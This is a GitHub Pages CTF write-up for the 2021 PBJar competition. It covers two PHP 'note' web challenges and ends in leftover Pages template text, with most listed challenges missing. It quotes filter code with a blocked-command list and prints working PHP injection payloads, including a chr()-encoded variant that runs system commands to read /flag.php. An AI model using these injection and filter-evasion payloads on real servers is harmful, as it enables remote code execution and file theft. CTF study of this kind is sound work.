# Welcome to my PBJar CTF Writeups for the 2021 PBJar CTF Competition.

## Table of Contents:

### Introduction
### Web
 - ProgrammersHateProgramming
 - ProgrammersHateProgramming2
 - cOrL
### Forensics
 - StegosaurusStenops
 - Polymer
 - Art Mystery
 - Luna Guesser
### Misc
 - Miner
 - MEV
### Crypto
 - ReallynotSecureAlgorithm
 - Convert
### Reversing
 - Polymer

## Introduction

Alrighty, so this is my first writeup for my first ever CTF competition and I thought I did pretty well!
  The team as a whole got 11 flags (not including the obligatory Given flag for getting the discord) and I 
got 6 of those during the time limit. I also went back and got a few flags after time ended just for my own
research purposes. Thank you for checking out my writeups and I hope you enjoy the presentation!

## Web

First off in the web category we have:
## ProgrammersHateProgramming
### Hint: URL of webpage as well as source code

Sourcecode reads:
```
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<script>", "", $notetoadd);
    $notetoadd = str_replace_first("</script>", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```
Just by looking at this sourcecode one can immediatly tell that this webpage is susceptible to php injection attacks.
The webpage had a text input bar that stored notes on the page, which was the main and only interface on the page.
Realizing that it only erased the _first_ value that it catches in the input bar, I immediatly got to work.
I started off sending a simple ```<?php <?php system("ls"); ?> ?>``` to see if it would do anything and it listed the contents
of the current directory, just as expected. As a shot in the dark, I sent ```<?php <?php system("cat /flag.php"); ?> ?>```
and it turned out the flag was at the root directory in a php file!

Flag: flag{server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we're_developing_a_really_meaningful_connection}

## ProgrammersHateProgramming2
### Hint: URL of webpage as well as source code

Sourcecode reads:
```
<?php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<?", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("ls", "", $notetoadd);
    $notetoadd = str_replace("ZeroDayTea is not hot", "", $notetoadd);

    $filename = generateRandomString();
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```
This webpage again has an input section that stores the input values on the server.
As one can see, this problem is very similar to the previous problem, however the web page catches a much wider range
of inputs. To get around this, I simply sent the code I needed into the input text box as ascii values. To do this, I
wrote code that would do it for me :)
```
instr = input("> ")

for c in instr:
    print("chr({}) . ".format(ord(c)), end="")

print()
```
This code takes input values and returns them as a string of ascii values.

since the sourcecode removes ```flag``` after removing ```<?php```, I had it create ```<?php``` by putting ```flag```
inside of ```<?php``` so: ```<flag?php```

I then tested if the ascii solution would work by sending:
```<flag?php system("chr(108) . chr(115) . chr(32) . chr(45) . chr(97) . chr(108) . chr(32) . chr(47)") ?> ?>```
(ls -al /)
which printed the list of files in the directory. After that I attempted to ```cat /flag.php``` like I did in 
ProgrammersHateProgramming:
```<flag?php system("chr(99) . chr(97) . chr(116) . chr(32) . chr(47) . chr(102) . chr(108) . chr(97) . chr(103) . chr(46) . chr(112) . chr(104) . chr(112)") ?> ?>```
which got us the flag!

Flag:
flag{wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)}

## Welcome to GitHub Pages

You can use the [editor on GitHub](https://github.com/Reycecar/PBJarCTFWriteups2021/edit/main/README.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```
